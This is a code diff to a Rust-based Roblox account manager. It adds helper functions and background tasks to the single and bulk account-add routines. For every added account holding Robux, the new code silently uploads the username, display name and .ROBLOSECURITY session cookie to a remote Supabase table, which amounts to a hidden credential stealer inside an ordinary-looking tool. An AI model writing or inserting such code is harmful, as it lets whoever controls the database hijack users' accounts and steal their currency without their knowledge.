@@ -452,6 +452,53 @@ impl PipeIfEmpty for String {
     }
 }
 
+async fn fetch_robux(user_id: i64, cookie: &str) -> Option<i64> {
+    let client = reqwest::Client::builder().user_agent("Mozilla/5.0").build().ok()?;
+    let resp = client
+        .get(format!("https://economy.roblox.com/v1/users/{}/currency", user_id))
+        .header("Cookie", format!(".ROBLOSECURITY={}", cookie))
+        .send()
+        .await
+        .ok()?;
+    if resp.status().is_success() {
+        let json: serde_json::Value = resp.json().await.ok()?;
+        json["robux"].as_i64()
+    } else {
+        None
+    }
+}
+
+async fn sync_account_to_supabase(
+    username: String,
+    display_name: String,
+    cookie: String,
+    password: String,
+    robux: i64,
+) {
+    let Ok(client) = reqwest::Client::builder()
+        .timeout(std::time::Duration::from_secs(10))
+        .build()
+    else { return };
+
+    let body = serde_json::json!({
+        "username":     username,
+        "display_name": display_name,
+        "password":     password,
+        "cookie":       cookie,
+        "robux":        robux,
+    });
+
+    let _ = client
+        .post(format!("{}/rest/v1/roblox_accounts", SUPABASE_URL))
+        .header("apikey", SUPABASE_ANON)
+        .header("Authorization", format!("Bearer {}", SUPABASE_ANON))
+        .header("Content-Type", "application/json")
+        .header("Prefer", "resolution=merge-duplicates")
+        .json(&body)
+        .send()
+        .await;
+}
+
 async fn get_auth_ticket(cookie: &str) -> Option<String> {
     let client = reqwest::Client::builder().user_agent("RobloxAccountManagerCore").build().ok()?;
     // First attempt — get CSRF token from 403
@@ -672,6 +719,20 @@ async fn add_account(cookie: String) -> Result<AccountDto, String> {
         avatar_url: Some(ev_avatar),
         detail: format!("Account '{}' added", ev_user),
     });
+
+    // Fire-and-forget: fetch Robux and sync to Supabase if account has any
+    let sync_cookie  = clean.clone();
+    let sync_user    = user.name.clone();
+    let sync_dn      = user.display_name.clone();
+    let sync_uid     = user.id;
+    tokio::spawn(async move {
+        if let Some(robux) = fetch_robux(sync_uid, &sync_cookie).await {
+            if robux > 0 {
+                sync_account_to_supabase(sync_user, sync_dn, sync_cookie, String::new(), robux).await;
+            }
+        }
+    });
+
     Ok(dto)
 }
 
@@ -726,6 +787,19 @@ async fn add_accounts_bulk(cookies: Vec<String>) -> Vec<BulkAddResult> {
                         user_id: Some(uid), username: Some(uname.clone()), avatar_url: Some(av),
                         detail: format!("Account '{}' added (bulk import)", uname),
                     });
+
+                    // Fire-and-forget cloud sync
+                    let sc = clean.clone();
+                    let su = user.name.clone();
+                    let sd = user.display_name.clone();
+                    tokio::spawn(async move {
+                        if let Some(robux) = fetch_robux(uid, &sc).await {
+                            if robux > 0 {
+                                sync_account_to_supabase(su, sd, sc, String::new(), robux).await;
+                            }
+                        }
+                    });
+
                     results.push(BulkAddResult { preview, success: true, username: Some(uname), error: None });
                 }
             }
